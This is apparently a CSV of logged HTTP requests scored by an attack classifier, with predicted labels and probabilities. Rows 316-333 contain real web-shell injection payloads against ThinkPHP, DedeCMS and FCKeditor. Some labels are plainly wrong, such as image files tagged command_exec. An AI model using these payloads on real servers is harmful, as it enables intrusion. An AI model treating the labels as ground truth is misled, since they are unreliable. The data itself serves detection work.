row_idx,text,pred_label,max_prob
170,METHOD=GET PATH=/Datasets%20Description/Network/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5314313173294067
171,METHOD=GET PATH=/Datasets%20Description/Network/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5432575941085815
172,METHOD=GET PATH=/Datasets%20Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5685432553291321
173,METHOD=GET PATH=/Datasets%20Description/Network/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5891454815864563
174,METHOD=GET PATH=/Datasets%20Description/Network/signatures.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5780556201934814
175,METHOD=GET PATH=/Datasets%20Description/Network/smtp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5483987331390381
176,METHOD=GET PATH=/Datasets%20Description/Network/ssh.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5835829377174377
177,METHOD=GET PATH=/Datasets%20Description/Network/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5611499547958374
178,METHOD=GET PATH=/Datasets%20Description/Network/tunnel.html QUERY= PROTOCOL=HTTP/1.1,benign,0.550652801990509
179,METHOD=GET PATH=/Datasets%20Description/Network/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5772854089736938
180,METHOD=GET PATH=/Datasets%20Description/PE_malware/OPCleaver.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5422806739807129
181,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
182,METHOD=GET PATH=/Datasets%20Description/PE_malware/Zeus.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5371832251548767
183,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353
184,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
185,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
186,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
187,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
188,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
189,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
190,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
191,METHOD=GET PATH=/self.logs/access.log.2019-10-24.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4570903480052948
192,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
193,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
194,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
195,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
196,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
197,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
198,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
199,METHOD=GET PATH=/Datasets%20Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5685432553291321
200,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
201,METHOD=GET PATH=/self.logs/error.log.2019-01-24.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4206598103046417
202,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
203,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
204,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
205,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
206,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
207,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
208,METHOD=GET PATH=/uploads/up.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.8424050211906433
209,METHOD=GET PATH=/sites/all/libraries/elfinder/elfinder.php.html QUERY= PROTOCOL=HTTP/1.1,command_exec,0.5479199290275574
210,METHOD=GET PATH=/images/vuln.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44586658477783203
211,METHOD=GET PATH=/ups.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.623659074306488
212,METHOD=GET PATH=/up.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.6996337175369263
213,METHOD=GET PATH=/wp-content/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.8007306456565857
214,METHOD=GET PATH=/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.7803764939308167
215,METHOD=GET PATH=/media-admin.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5428050756454468
216,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
217,METHOD=GET PATH=/self.logs/access.log.2018-01-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44583991169929504
218,METHOD=GET PATH=/ads.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41103294491767883
219,METHOD=GET PATH=/honeypot/bsidesdfw%20-%202014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign,0.39535993337631226
220,METHOD=GET PATH=/self.logs/access.log.2021-04-27.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45773324370384216
221,METHOD=GET PATH=/self.logs/error.log.2018-04-22.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43003448843955994
222,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
223,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
224,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
225,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
226,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
227,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
228,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
229,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
230,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
231,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
232,METHOD=GET PATH=/domaindata/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7230401635169983
233,METHOD=GET PATH=/apple-touch-icon.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.37689048051834106
234,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
235,METHOD=GET PATH=/apple-touch-icon.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.37689048051834106
236,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
237,METHOD=GET PATH=/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7431632280349731
238,METHOD=GET PATH=/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7431632280349731
239,METHOD=GET PATH=/self.logs/error.log.2019-09-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4096969962120056
240,METHOD=GET PATH=/domaindata/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7230401635169983
241,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
242,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
243,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
244,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
245,METHOD=GET PATH=/domaindata/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7230401635169983
246,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
247,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
248,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
249,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
250,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
251,METHOD=GET PATH=/self.logs/access.log.2019-01-27.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45979568362236023
252,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
253,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
254,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
255,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.4974004030227661
256,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.4688447117805481
257,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.4933105707168579
258,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,benign,0.4917145073413849
259,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,benign,0.5004051923751831
260,METHOD=GET PATH=/Datasets%20Description/Network/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.4963632822036743
261,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.48455244302749634
262,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,benign,0.48196008801460266
263,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,benign,0.480240136384964
264,METHOD=GET PATH=/Datasets%20Description/PE_malware/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.48653101921081543
265,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
266,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
267,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057440757751465
268,METHOD=GET PATH=/self.logs/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4098285138607025
269,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4299328923225403
270,METHOD=GET PATH=/self.logs/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4082556962966919
271,METHOD=GET PATH=/self.logs/2015/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43429169058799744
272,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465
273,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4384268522262573
274,METHOD=GET PATH=/self.logs/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4483668804168701
275,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4019940197467804
276,METHOD=GET PATH=/self.logs/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44058606028556824
277,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
278,METHOD=GET PATH=/self.logs/2015/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4070121645927429
279,METHOD=GET PATH=/self.logs/2015/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40792790055274963
280,METHOD=GET PATH=/self.logs/2015/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42459577322006226
281,METHOD=GET PATH=/self.logs/2015/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40308234095573425
282,METHOD=GET PATH=/self.logs/2016/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.39524802565574646
283,METHOD=GET PATH=/self.logs/2016/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3962686061859131
284,METHOD=GET PATH=/self.logs/2016/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4135914444923401
285,METHOD=GET PATH=/self.logs/2016/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.393920361995697
286,METHOD=GET PATH=/self.logs/2015/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43751388788223267
287,METHOD=GET PATH=/self.logs/2015/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4450225234031677
288,METHOD=GET PATH=/self.logs/2015/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3942822217941284
289,METHOD=GET PATH=/self.logs/2015/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4375974237918854
290,METHOD=GET PATH=/self.logs/2016/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4225592315196991
291,METHOD=GET PATH=/self.logs/2016/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4275737702846527
292,METHOD=GET PATH=/self.logs/2016/ QUERY=C=N;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.38818758726119995
293,METHOD=GET PATH=/self.logs/2016/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42012807726860046
294,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
295,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353
296,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1 QUERY= PROTOCOL=HTTP/1.1,benign,0.6136957406997681
297,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2 QUERY= PROTOCOL=HTTP/1.1,benign,0.6024762392044067
298,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377134680747986
299,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
300,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
301,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
302,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
303,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
304,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
305,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
306,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465
307,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
308,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
309,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
310,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
311,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
312,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
313,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
314,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
315,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
316,METHOD=POST PATH=/FCKeditor/editor/filemanager/connectors/asp/connector.asp QUERY=Command=FileUpload&Type=File&CurrentFolder=%2F PROTOCOL=HTTP/1.1,command_exec,0.6429962515830994
317,METHOD=GET PATH=/index.php QUERY=m=member&c=index&a=register&siteid=1 PROTOCOL=HTTP/1.1,command_exec,0.42297330498695374
318,METHOD=POST PATH=/admin_aspcms/_system/AspCms_SiteSetting.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.3469432294368744
319,METHOD=GET PATH=/plus/moon.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44791358709335327
320,METHOD=POST PATH=/plus/90sec.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.42047426104545593
321,METHOD=POST PATH=/utility/convert/index.php QUERY=a=config&source=d7.2_x2.0 PROTOCOL=HTTP/1.1,command_exec,0.5237575173377991
322,METHOD=POST PATH=/utility/convert/data/config.inc.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.547547459602356
323,METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// PROTOCOL=HTTP/1.1,command_exec,0.8581370711326599
324,METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1,command_exec,0.8373600840568542
325,METHOD=POST PATH=/index.php/api/Uploadify/preview QUERY= PROTOCOL=HTTP/1.1,command_exec,0.623397171497345
326,METHOD=GET PATH=/user.php QUERY=act=login PROTOCOL=HTTP/1.1,command_exec,0.5571810603141785
327,METHOD=POST PATH=/fdgq.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.45104455947875977
328,"METHOD=GET PATH=/ QUERY=s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=ppeeu.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E PROTOCOL=HTTP/1.1",command_exec,0.7207354307174683
329,METHOD=POST PATH=/ppeeu.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45686331391334534
330,METHOD=GET PATH=/user.php QUERY=act=login PROTOCOL=HTTP/1.1,command_exec,0.5571810603141785
331,METHOD=POST PATH=/ysyqq.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41941767930984497
332,"METHOD=GET PATH=/ QUERY=s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=txual.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$ PROTOCOL=HTTP/1.1",command_exec,0.6881241798400879
333,METHOD=POST PATH=/txual.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44853901863098145
